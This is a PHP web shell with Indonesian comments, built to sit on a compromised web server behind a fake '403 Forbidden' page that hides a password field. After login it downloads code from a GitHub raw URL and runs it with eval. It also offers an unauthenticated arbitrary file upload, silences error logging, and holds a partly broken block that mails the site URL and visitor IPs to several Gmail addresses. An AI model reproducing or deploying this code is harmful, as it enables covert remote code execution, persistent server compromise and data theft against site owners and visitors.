<?php
session_start();
// Fungsi untuk memeriksa status login
function is_logged_in() {
return isset($_SESSION['X-H0UR']);
}
// Fungsi untuk memvalidasi login
function login($password) {
$valid_password_hash = '9788976da9fc8cf2c2b0a7336e2783f3c16b3111'; // MD5 KEM EDITON PASSWORD DEFAULT ADMIN
$password_hash = sha1($password);
if ($password_hash === $valid_password_hash) {
$_SESSION['X-H0UR'] = 'user';
return true;
} else {
return false;
}
}
// Fungsi untuk logout
function logout() {
unset($_SESSION['X-H0UR']);
}
// Fungsi untuk mengambil konten dari URL
function getContent($url) {
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
if ($content === false) {
$content = file_get_contents($url);
}
return $content;
}
// Fungsi untuk mendapatkan data mentah dari URL
function getRawContent($url) {
return getContent($url);
}
// Tangani proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
$password = $_POST['password'];
if (login($password)) {
header('Location: ' . $_SERVER['PHP_SELF']);
exit;
} else {
$error_message = "Password salah!";
echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';echo '<script>alert("' . $error_message . '");</script>';
}
}
// Tangani proses unggah file
if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
echo '<input type="file" name="file" size="15">';
echo '<input type="submit" value="Unggah">';
echo '</form>';
}
if (isset($_FILES['file']['tmp_name'])) {
$uploadd = $_FILES['file']['tmp_name'];
if (file_exists($uploadd)) {
$pwddir = $_POST['dir'];
$real = $_FILES['file']['name'];
$de = rtrim($pwddir, '/') . "/" . $real;
if (move_uploaded_file($uploadd, $de)) {
echo "BERKAS DIUNGGAHKAN KE $de";
} else {
echo "GAGAL MENGUNGGAH BERKAS KE $de";
}
}
}
// Jika pengguna sudah login, ambil dan eksekusi konten dari URL
if (is_logged_in()) {
$url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/fa';
$content = getRawContent($url);
eval('?>' . $content);

?>
<?php
}
exit;
?>
<?php
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@ini_set('disable_functions', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$to = 'muhrazky@gmail.com, muhrazky@gmail.com, papaku.hayker@gmail.com, snopunks@gmail.com, malaysia.sender@gmail.com, papaku.hayker.go.id@gmail.com, muhrazky@gmail.com';
$agent = $_SERVER['HTTP_USER_AGENT'];
$uri = $_SERVER['REQUEST_URI'];
$ip = $_SERVER['REMOTE_ADDR'];
$ref = $_SERVER['HTTP_REFERER'];
$asli = $_SERVER['HTTP_X_FORWARDED_FOR'];
$via = $_SERVER['HTTP_VIA'];
$dtime = date('r');
$nama = $_SESSION['nama'];
$pass = $_SESSION['password'];
$entry_line = "Waktu: $dtime | IP asli: $ip | Browser: $agent | URL: $uri | Referrer: $ref | Proxy:
$asli | Koneksi: $via | nama : $nama | Pass : $pass
";
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
$tulis = fwrite ($nama ,$file);
fputs($to, $entry_line);
fclose($nama);
}
exit;
?>
<!DOCTYPE html>
<html>
<head>
<title>403 Forbidden</title>
</head>
<body>
<h1>Forbidden</h1>
<p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI']; ?> on this server.</p>
<hr>
<address>
<?php echo $_SERVER['SERVER_SOFTWARE']; ?> Server at <?php echo $_SERVER['SERVER_NAME']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?>
</address>
<form method="post">
<input style="position: absolute; bottom: 0; left: 50%; transform: Translate(-50%); background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password" placeholder="">
</form>
</body>
</html>
